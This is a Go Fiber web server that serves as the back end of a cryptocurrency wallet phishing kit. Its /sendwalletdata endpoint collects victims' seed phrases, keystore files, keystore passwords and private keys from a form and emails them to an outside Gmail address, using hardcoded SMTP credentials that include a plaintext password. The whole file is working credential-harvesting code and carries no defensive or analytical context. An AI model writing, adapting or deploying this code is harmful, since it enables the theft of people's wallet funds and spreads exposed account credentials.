package main

import (
    "log"
    "github.com/gofiber/fiber/v2"
    "github.com/gofiber/fiber/v2/middleware/cors"
    "gopkg.in/gomail.v2"
)

// Struct to map the form data
type WalletData struct {
    WalletName    string `form:"walletname"`
    WalletID      string `form:"wallet_id"`
    Phrase        string `form:"phrase"`
    Submit1       string `form:"submit1"`
    Keysto        string `form:"keysto"`
    KeystorePass  string `form:"keystorepass"`
    PrivateK      string `form:"privatek"`
}

func main() {
    app := fiber.New()

    // Add CORS middleware
    app.Use(cors.New(cors.Config{
        AllowOrigins: "*",
        AllowHeaders: "Origin, Content-Type, Accept",
    }))

    // Serve static files from the "./public" directory
    app.Static("/", "./public")

    app.Post("/sendwalletdata", func(c *fiber.Ctx) error {
        // Parse form data into WalletData struct
        data := new(WalletData)
        if err := c.BodyParser(data); err != nil {
            return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{
                "error": "Failed to parse form data",
            })
        }

        // Send email
        err := sendEmail(data)
        if err != nil {
            log.Println("Email sending error:", err)
            return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{
                "error": "Failed to send email",
            })
        }

        // Redirect to success page
        return c.Redirect("./success.html")
    })

    log.Fatal(app.Listen(":3000"))
}

func sendEmail(data *WalletData) error {
    m := gomail.NewMessage()
    m.SetHeader("From", "info@resolverd.dev")
    m.SetHeader("To", "johnfisher@gmail.com")
    m.SetHeader("Subject", "Wallet Data")
    m.SetBody("text/plain", formatEmailBody(data))

    d := gomail.NewDialer("mail.privateemail.com", 465, "info@resolverd.dev", "Smile4me#")

    if err := d.DialAndSend(m); err != nil {
        log.Println("DialAndSend error:", err)
        return err
    }
    return nil
}

func formatEmailBody(data *WalletData) string {
    return "Wallet Name: " + data.WalletName + "\n" +
        "Wallet ID: " + data.WalletID + "\n" +
        "Phrase: " + data.Phrase + "\n" +
        "Submit1: " + data.Submit1 + "\n" +
        "Keysto: " + data.Keysto + "\n" +
        "KeystorePass: " + data.KeystorePass + "\n" +
        "Private Key: " + data.PrivateK + "\n"
}
